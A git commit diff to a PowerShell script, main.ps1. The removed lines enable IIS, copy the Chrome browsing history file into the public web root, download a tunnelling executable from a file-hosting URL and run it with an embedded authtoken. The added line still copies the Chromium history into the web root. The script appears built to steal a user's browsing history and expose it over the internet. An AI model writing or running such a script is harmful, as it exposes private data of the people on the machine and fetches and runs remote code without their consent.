efe4ea5f6942025a6ee75bfc82308de138f1dfe3
mehmetdere <105990633+mehmetdere@users.noreply.github.com>
2022-09-18 14:51:46 +0300

    v2 test

--- main.ps1
+++ main.ps1
@@ -1,5 +1,1 @@
-DISM /online /enable-feature /featureName:IIS-DefaultDocument /All 
- Copy-Item '\AppData\Local\Google\Chrome\User Data\Default\History' 'C:\inetpub\wwwroot\History File.txt' 
-Invoke-WebRequest -Uri http://download2273.mediafire.com/h05zo02pnm9g/et8b7qf4zvq5408/localtonet.exe -OutFile (Join-Path Downloads localtonet.exe)
-cd Downloads
-./localtonet authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI 
+ Copy-Item '\AppData\Local\Chromium\User Data\Default\History' 'C:\inetpub\wwwroot\History File ' 
